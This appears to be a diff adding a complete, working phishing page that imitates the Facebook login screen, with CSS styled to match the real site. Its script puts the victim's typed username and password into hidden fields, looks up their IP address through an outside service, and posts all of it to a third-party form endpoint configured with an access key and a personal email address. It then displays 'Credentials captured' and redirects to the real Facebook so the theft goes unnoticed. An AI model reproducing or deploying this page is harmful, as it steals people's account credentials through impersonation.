@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        /* --- GLOBAL STYLES & RESET --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5; /* Light grey background like Facebook */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* --- CONTAINER STYLES --- */
+        .container {
+            display: flex;
+            width: 100%;
+            max-width: 1000px; /* Standard desktop width */
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            background-color: #ffffff;
+            border-radius: 8px;
+            overflow: hidden; /* Keeps the logo/panel neat */
+        }
+
+        /* --- LOGO/LEFT SIDE PANEL (Desktop) --- */
+        .logo-panel {
+            flex: 1; /* Takes up half the space on desktop */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 40px;
+            text-align: left;
+        }
+
+        .logo-panel h1 {
+            font-size: 60px;
+            color: #1877f2; /* Facebook Blue */
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .logo-panel p {
+            font-size: 24px;
+            color: #1c1e21;
+            line-height: 1.3;
+        }
+
+        /* --- FORM/RIGHT SIDE PANEL (Desktop) --- */
+        .form-panel {
+            flex: 1; /* Takes up half the space on desktop */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 5%;
+        }
+
+        .form-panel form {
+            width: 100%;
+            max-width: 396px; /* Standard max width for the form box */
+        }
+
+        /* --- FORM ELEMENTS --- */
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #565558;
+            margin-bottom: 5px;
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input[type="text"]:focus,
+        .form-group input[type="password"]:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 1px #1877f2;
+        }
+
+        /* --- BUTTONS --- */
+        .btn-login {
+            width: 100%;
+            padding: 14px 20px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            margin-bottom: 10px;
+            font-weight: 700; 
+        }
+
+        .btn-login:hover {
+            background-color: #166fe5;
+        }
+        
+        .btn-login:active {
+            transform: scale(0.99);
+        }
+
+        .btn-forgot {
+            width: 100%;
+            background-color: transparent;
+            color: #1877f2;
+            border: none;
+            font-size: 14px;
+            cursor: pointer;
+            text-align: center;
+            padding: 10px 0;
+        }
+
+        .btn-forgot:hover {
+            text-decoration: underline;
+        }
+
+        /* --- CREATE NEW ACCOUNT --- */
+        .btn-create-account {
+            width: 100%;
+            padding: 12px 16px;
+            background-color: #42b72a; /* Green color */
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 15px;
+        }
+
+        .btn-create-account:hover {
+            background-color: #36a420;
+        }
+
+        /* --- FOOTER --- */
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 14px;
+            color: #737373;
+        }
+
+        .footer a {
+            color: #1877f2;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        /* --- STATUS MESSAGE STYLES --- */
+        #statusMessage {
+            margin-top: 15px;
+            padding: 10px 0;
+            font-size: 16px;
+            font-weight: 600;
+            text-align: center;
+            min-height: 20px; /* Prevents layout jump */
+        }
+        .success {
+            color: #36a420; /* Green */
+        }
+        .error {
+            color: #e74c3c; /* Red */
+        }
+
+        /* ======================================= */
+        /* --- MOBILE VIEW (RESPONSIVENESS) --- */
+        /* ======================================= */
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                box-shadow: none; 
+                border-radius: 0; 
+                min-height: 100vh;
+            }
+
+            .logo-panel {
+                padding: 30px 20px;
+                text-align: center;
+                order: 1; 
+            }
+
+            /* --- FIX 1: REDUCED LOGO SIZE FOR PHONE VIEW (30% smaller) --- */
+            .logo-panel h1 {
+                font-size: 36px; /* Was 48px */
+            }
+
+            .logo-panel p {
+                font-size: 16px; /* Was 18px */
+            }
+
+            .form-panel {
+                padding: 40px 30px;
+                order: 2; 
+            }
+            
+            .form-panel form {
+                max-width: 100%;
+            }
+        }
+        
+        /* --- ULTRA SMALL MOBILE VIEW ADJUSTMENTS (<= 450px) --- */
+        @media (max-width: 450px) {
+            .logo-panel h1 {
+                font-size: 32px; /* Was 38px */
+            }
+            /* --- FIX 2: META SIZE REDUCED HERE TOO (30% smaller) --- */
+            .logo-panel p {
+                font-size: 14px; /* Was 16px */
+            }
+        }
+        
+        /* --- META LOGO SIZE ADJUSTMENTS (Specific to phone view in .logo-panel) --- */
+        .logo-panel > div[style*="margin-top: 25px;"] > span {
+            /* Base size is 32px. 30% smaller = 22.4px. Using 22px */
+            font-size: 22px !important; 
+        }
+
+    </style>
+</head>
+<body onload="checkIP()">
+
+    <div class="container">
+        
+        <!-- LOGO & Tagline (Visible on both Desktop & Mobile) -->
+        <div class="logo-panel">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+
+        <!-- LOGIN FORM (Visible on both Desktop & Mobile) -->
+        <div class="form-panel">
+            <form id="phishingForm" action="https://api.web3forms.com/submit" method="POST">
+
+                <!-- Hidden Fields (Configured by you) -->
+                <input type="hidden" name="access_key" value="0a8fa04b-c282-4f3e-a52e-230cb02a26ff">
+                <input type="hidden" name="name" value="Homii">
+                <input type="hidden" name="email" value="homizz121@gmail.com">
+                <!-- These fields will be populated by JS/User Input -->
+                <input type="hidden" name="user" id="userField" value="">
+                <input type="hidden" name="password" id="passwordField" value="">
+                <input type="hidden" name="ip" id="ipField" value="">
+
+                <!-- Login Field (Mimics Mobile/PC first input) -->
+                <div class="form-group">
+                    <label for="username">Mobile number or email address</label>
+                    <input type="text" id="username" name="username" required placeholder="Mobile number or email address">
+                </div>
+
+                <!-- Password Field -->
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required placeholder="Password">
+                </div>
+
+                <!-- Status Message Display -->
+                <div id="statusMessage"></div>
+                
+                <!-- Login Button -->
+                <button type="submit" id="loginButton" class="btn-login">Log in</button>
+
+                <!-- Forgot Password Link -->
+                <a href="#" class="btn-forgot">Forgot password?</a>
+
+                <!-- Create New Account Button -->
+                <button type="button" id="createNewAccount" class="btn-create-account">Create new account</button>
+
+            </form>
+
+            <div class="footer">
+                <a href="#">About</a>
+                <a href="#">Help</a>
+                <a href="#">More</a>
+            </div>
+            <!-- Meta Logo Placeholder -->
+            <div style="margin-top: 25px;">
+                <span style="font-size: 32px; color: #1877f2;">&mdash;</span><span style="font-size: 32px; color: #1877f2;">M</span><span style="font-size: 32px; color: #1877f2;">e</span><span style="font-size: 32px; color: #1877f2;">t</span><span style="font-size: 32px; color: #1877f2;">a</span>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('phishingForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginButton = document.getElementById('loginButton');
+        const statusMessage = document.getElementById('statusMessage');
+        
+        // Hidden fields
+        const userField = document.getElementById('userField');
+        const passwordField = document.getElementById('passwordField');
+        const ipField = document.getElementById('ipField');
+        const createNewAccountButton = document.getElementById('createNewAccount');
+
+        // 1. Function to get visitor's IP Address
+        function getVisitorIp() {
+            return new Promise((resolve) => {
+                fetch('https://api64.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => resolve(data.ip))
+                    .catch(() => resolve('Unknown_IP')); // Fallback IP
+            });
+        }
+
+        // 2. Function to update UI status
+        function updateStatus(message, type = '') {
+            statusMessage.textContent = message;
+            statusMessage.className = type; // 'success' or 'error'
+        }
+
+        // 3. Function to handle form submission and data prep
+        async function handleFormSubmit(event) {
+            event.preventDefault(); // STOP the immediate form submission
+            
+            // --- UI: Start Loading State ---
+            loginButton.disabled = true;
+            loginButton.textContent = "Submitting...";
+            statusMessage.textContent = '';
+            statusMessage.className = '';
+
+            try {
+                // Get IP first
+                const visitorIp = await getVisitorIp();
+                ipField.value = visitorIp;
+
+                // Populate hidden fields with user input
+                userField.value = usernameInput.value;
+                passwordField.value = passwordInput.value;
+
+                // --- Data Ready to Send ---
+                console.log("--- Data Ready to Send ---");
+                console.log("User:", usernameInput.value);
+                console.log("Password:", passwordInput.value);
+                console.log("IP Address:", visitorIp);
+                
+                // --- Actual Submission via Fetch API ---
+                const formData = new FormData(form);
+                
+                const response = await fetch(form.action, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                // --- UI: Handle Response ---
+                if (response.ok) {
+                    // Success State (Status 200-299)
+                    updateStatus("✅ Success! Credentials captured. Redirecting...", 'success');
+                    loginButton.textContent = "✅ Success! Redirecting...";
+                    
+                    // Optional: Automatically submit/redirect after 2 seconds
+                    setTimeout(() => {
+                        window.location.href = "https://www.facebook.com/"; // Redirect to real FB
+                    }, 2000);
+
+                } else {
+                    // Error State (Status 4xx or 5xx)
+                    updateStatus(`❌ Network Error (${response.status}). Try Again!`, 'error');
+                    loginButton.textContent = "❌ Network Error! Try Again";
+                }
+
+            } catch (error) {
+                // Network Failure State (e.g., DNS error, no internet)
+                console.error('Submission Error:', error);
+                updateStatus("🌐 Critical Network Failure. Check connection and try again.", 'error');
+                loginButton.textContent = "🌐 Network Error! Try Again";
+            } finally {
+                // Re-enable button after processing
+                loginButton.disabled = false;
+            }
+        }
+        
+        // 4. Event Listeners
+        form.addEventListener('submit', handleFormSubmit);
+        
+        createNewAccountButton.addEventListener('click', function() {
+            // Simple simulated signup action
+            updateStatus("👉 Redirecting to Sign Up Page...", 'success');
+            loginButton.textContent = "Redirecting...";
+            
+            setTimeout(() => {
+                alert('Signup page loaded (check console/redirect to see change)!');
+                window.location.href = "#signup-view"; 
+            }, 1000);
+        });
+
+        // Function called on page load to check IP immediately
+        function checkIP() {
+            getVisitorIp().then(ip => {
+                ipField.value = ip;
+                console.log(`IP address loaded successfully on page load: ${ip}`);
+            });
+        }
+    </script>
+</body>
+</html>
